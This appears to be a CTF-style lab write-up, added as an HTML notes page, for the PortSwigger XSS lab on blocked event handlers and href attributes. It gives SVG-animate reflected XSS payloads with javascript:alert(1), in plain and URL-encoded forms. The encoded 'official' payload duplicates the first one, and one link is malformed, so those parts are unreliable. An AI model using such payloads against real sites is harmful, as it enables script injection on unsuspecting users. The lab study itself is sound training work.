@@ -1,0 +1,64 @@
+<!doctype html>
+<html>
+
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <title>Event handlers and href attributes blocked</title>
+  <meta name="generator" content="CherryTree">
+  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
+</head>
+
+<body>
+  <div class='page'>
+    <h1 class='title'>Event handlers and href attributes blocked</h1>
+    <br /><br /><br /><br /><strong>Example:</strong><br />0. Location of the Response with “payload” “204a2fb1”: <br />
+    <a href=""><img src="images/1929-1.png" alt="images/1929-1.png" /></a><br /> between HTML tags<br />1. Use
+    Portswigger cheat-sheet( <a
+      href="https://portswigger.net/web-security/cross-site-scripting/cheat-sheet" target="_blank">https://portswigger.net/web-security/cross-site-scripting/cheat-sheet</a>)
+    with Burp Intruder:<br /> ◇ <span style="text-decoration:underline;">Tags</span> attributes allowed: a,
+    animate,svg,title<br /> <a href=""><img src="images/1929-2.png" alt="images/1929-2.png" /></a><br /> ◇ <span
+      style="text-decoration:underline;">Events Handlers</span> attributes allowed: No One!<br /> <a href=""><img
+        src="images/1929-3.png" alt="images/1929-3.png" /></a><br /><br />1. Set svg--&gt;animate because are the two
+    tags allowed<br /> <a href=""><img src="images/1929-4.png" alt="images/1929-4.png" /></a><br />2. These are the
+    payload that we can use, from the Potswigger cheatsheet <br /> <a href=""><img src="images/1929-5.png"
+        alt="images/1929-5.png" /></a> <br /> We can see that there is also the <strong>href</strong> HTML attribute (<a
+      href="https://www.w3schools.com/tags/ref_attributes.asp" target="_blank">here the list of all html attributes</a>) to be tested.
+    <br /> Test it “/search=href=”random&quot;<br /> Unfortunately it is not allowed as seen below<br /> <a href=""><img
+        src="images/1929-6.png" alt="images/1929-6.png" /></a><br /><br />3. Because there is nothing in the Portswigger
+    cheat-sheat let&#39;s go to check the <a
+      href="http://https:/https://it1lib.org/book/16086758/42740e/www.w3schools.com/tags/ref_attributes.asp" target="_blank">Rodolfo
+      Assis Cheat Sheet 2020</a><br /> <a href=""><img src="images/1929-7.png" alt="images/1929-7.png" /></a><br /> <a
+      href=""><img src="images/1929-8.png" alt="images/1929-8.png" /></a><br /><br />4. <strong>Solution</strong><br />
+    ◇ BruteLogic (Rodolfo Assis) from the book<br />
+    <div class="codebox">
+      <div class="codebox">/?search=&lt;svg&gt;&lt;a&gt;&lt;rect&nbsp;width=99%&nbsp;height=99%&nbsp;/&gt;<span
+          style="color:#000000;font-weight:400">&lt;</span>animate&nbsp;attributeName=href&nbsp;values=javascript:alert(1)<span
+          style="color:#000000;font-weight:400">&gt;</span></div>
+    </div><br /> encode the payload with Burp Decoder(url option) and send it from burp<br />
+    <div class="codebox">
+      <div class="codebox">
+        /?search=%3c%73%76%67%3e%3c%61%3e%3c%72%65%63%74%20%77%69%64%74%68%3d%39%39%25%20%68%65%69%67%68%74%3d%39%39%25%20%2f%3e%3c%61%6e%69%6d%61%74%65%20%61%74%74%72%69%62%75%74%65%4e%61%6d%65%3d%68%72%65%66%20%76%61%6c%75%65%73%3d%6a%61%76%61%73%63%72%69%70%74%3a%61%6c%65%72%74%28%31%29%3e
+      </div>
+    </div><br /> <a href=""><img src="images/1929-9.png" alt="images/1929-9.png" /></a><br /> <a href=""><img
+        src="images/1929-10.png" alt="images/1929-10.png" /></a><br /> ◇ Official Portswigger solution <br />
+    <div class="codebox">
+      <div class="codebox">
+        /?search=&lt;svg&gt;&lt;a&gt;&lt;animate&nbsp;attributeName=href&nbsp;values=javascript:alert(1)&nbsp;/&gt;&lt;text&nbsp;x=20&nbsp;y=20&gt;Click&nbsp;me&lt;/text&gt;<span
+          style="color:#000000;font-weight:400">&lt;</span>/a<span style="color:#000000;font-weight:400">&gt;</span>
+      </div>
+    </div><br /> encode the payload with Burp Decoder(url option) and send it from burp<br />
+    <div class="codebox">
+      <div class="codebox">
+        /?search=%3c%73%76%67%3e%3c%61%3e%3c%72%65%63%74%20%77%69%64%74%68%3d%39%39%25%20%68%65%69%67%68%74%3d%39%39%25%20%2f%3e%3c%61%6e%69%6d%61%74%65%20%61%74%74%72%69%62%75%74%65%4e%61%6d%65%3d%68%72%65%66%20%76%61%6c%75%65%73%3d%6a%61%76%61%73%63%72%69%70%74%3a%61%6c%65%72%74%28%31%29%3e
+      </div>
+    </div><br /> <a href=""><img src="images/1929-11.png" alt="images/1929-11.png" /></a><br /> <a href=""><img
+        src="images/1929-12.png" alt="images/1929-12.png" /></a><br /><br /><span
+      style="text-decoration:underline;">Note</span> that these payloads need the interaction of the
+    user<br /><br /><strong>Bibliography:</strong><br />• <a
+      href="https://portswigger.net/web-security/cross-site-scripting/cheat-sheet" target="_blank">https://portswigger.net/web-security/cross-site-scripting/cheat-sheet</a><br />•
+    <a
+      href="https://portswigger.net/web-security/cross-site-scripting/contexts/lab-event-handlers-and-href-attributes-blocked" target="_blank">https://portswigger.net/web-security/cross-site-scripting/contexts/lab-event-handlers-and-href-attributes-blocked</a>
+  </div>
+</body>
+
+</html>
